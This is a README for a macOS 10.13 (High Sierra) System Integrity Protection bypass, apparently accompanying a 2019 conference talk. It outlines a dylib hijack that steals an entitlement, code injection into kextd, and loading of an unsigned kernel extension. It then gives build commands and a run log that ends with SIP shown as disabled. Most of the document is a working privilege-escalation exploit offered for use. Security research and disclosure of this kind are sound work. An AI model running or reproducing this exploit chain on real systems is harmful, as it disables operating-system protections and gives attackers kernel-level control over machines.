# macOS 10.13.x SIP bypass (kernel privilege escalation)

Works only on High Sierra, and requires root privilege. It can be chained with my previous local root exploits.

## Slides

https://conference.hitb.org/hitbsecconf2019ams/materials/D2T2%20-%20ModJack%20-%20Hijacking%20the%20MacOS%20Kernel%20-%20Zhi%20Zhou.pdf

* `symbols` has `com.apple.system-task-ports` entitlement thus it can get the task port of `kextd` via `task_for_pid`
* Trigger dylib hijack to load evil payload in process `symbols` and steal the entitlement
* `kextd` / `kextutil` / `kextload` pose `com.apple.rootless.kext-secure-management`, with whom the userspace can send MKext request to XNU to load KEXT
* All the validation are checked in userland: code signature, root filesystem permission, User-Approved Kernel Extension Loading, KEXT staging
* Directly ask XNU to load our KEXT without code signature

## Build

First, grab the dependencies

```sh
git submodule init
git submodule update
```

Build [Unrootless.kext](https://github.com/LinusHenze/Unrootless-Kext)

```sh
pushd 3rd-party/Unrootless-Kext ; xcodebuild ; popd
```

Build kernel exploit

```sh
pushd libinj ; make ; popd; pushd kernel ; make ; popd
```

## Run

```
$ sudo ./kernel/bin/exp
Password:
2019-05-13 01:11:14.826 exp[666:7308] [LightYear] taytay pid: 668
2019-05-13 01:11:14.828 exp[666:7308] [LightYear] status: 0, pid 669
2019-05-13 01:11:14.892 symbols[669:7313] [LightYear] I am in symbols
2019-05-13 01:11:14.895 symbols[669:7313] [LightYear] inject /Users/test/Downloads/1/kernel/bin/Toolchains/XcodeDefault.xctoolchain/> usr/lib/libswiftDemangle.dylib to kextd
get task port (OK)
allocate stack (OK)
remote stack 0x10714d000
allocate code (OK)
remote code 0x1041e7000
write loader code (OK)
mark code as eXecutable (OK)
mark stack as RW (OK)
write params (OK)
create remote thread (OK)
So it's gonna be forever
```

Then try to load any unsigned KEXT

```
$ csrutil status
System Integrity Protection status: enabled.
$ codesign -dvvv "./3rd-party/Unrootless-Kext/build/Release/Unrootless.kext"
./3rd-party/Unrootless-Kext/build/Release/Unrootless.kext: code object is not signed at all
$ sudo kextload 3rd-party/Unrootless-Kext/build/Release/Unrootless.kext
$ csrutil status
System Integrity Protection status: disabled.
```